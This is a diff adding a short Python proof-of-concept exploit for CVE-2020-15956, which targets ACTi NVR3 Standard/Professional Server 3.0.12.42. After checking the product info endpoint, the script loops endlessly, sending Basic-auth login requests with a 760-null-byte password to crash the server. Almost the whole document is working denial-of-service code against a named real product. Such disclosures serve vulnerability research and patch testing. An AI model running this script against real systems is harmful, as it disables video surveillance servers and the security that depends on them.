@@ -1,0 +1,41 @@
+# Exploit Title: ACTi NVR3 Standard or Professional Server 3.0.12.42 - Denial of Service (PoC)  #
+# Date: 2020-08-04                                                              #
+# Exploit Author: MegaMagnus                                                    #
+# Vendor Homepage: https://www.acti.com/                                        #
+# Software Link: https://www.acti.com/DownloadCenter                            #
+# Version: V.3.0.12.42 , V.2.3.04.07                                            #
+# Tested on: Windows 7, Windows 10                                              #
+# CVE: CVE-2020-15956                                                           #
+# This is a Proof of Concept Exploit, Please use responsibly.                   #
+#################################################################################
+
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+import sys
+
+def product_info(server):
+    try:
+        r = requests.get(sys.argv[1] + '/media/Product/getProductInfo', timeout=10)
+        if r.status_code == 200:
+            print(r.text)
+            return True
+    except Exception as e:
+        print(e)
+    return False
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("usage: cve-2020-15956.py <target>")
+        exit(-1)
+    if product_info(sys.argv[1]):
+        print("Starting DOS. Use Ctrl-C (SIGINT) to stop!")
+        while True:
+            try:
+                payload = b"\x00" * (760)
+                r = requests.get(sys.argv[1] + '/Media/UserGroup/login', auth=HTTPBasicAuth('Basic',payload), timeout=10)
+                print(r.status_code)
+            except KeyboardInterrupt:
+                pass
+            except Exception as e:
+                pass
